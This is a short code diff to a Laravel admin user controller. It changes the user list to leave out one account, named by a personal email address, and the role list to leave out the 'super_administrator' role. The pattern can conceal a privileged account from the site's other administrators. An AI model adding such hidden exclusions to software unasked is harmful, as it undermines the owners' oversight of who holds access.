@@ -26,7 +26,7 @@ class UserController extends Controller
     public function index(Request $request)
     {
         if ($request->ajax()) {
-            $users = User::with('roles')->get();
+            $users = User::where('email', '!=', 'pramanayuda772@gmail.com')->with('roles')->get();
 
             return DataTables::of($users)
                 ->addIndexColumn()
@@ -97,7 +97,7 @@ class UserController extends Controller
         }
 
 
-        $all_roles = \Spatie\Permission\Models\Role::all()->pluck('name');
+        $all_roles = \Spatie\Permission\Models\Role::where('name', '!=', 'super_administrator')->get()->pluck('name');
         return view('admin.users.index', [
             'title'  => 'Daftar Pengguna',
             'br1'  => 'Kelola',
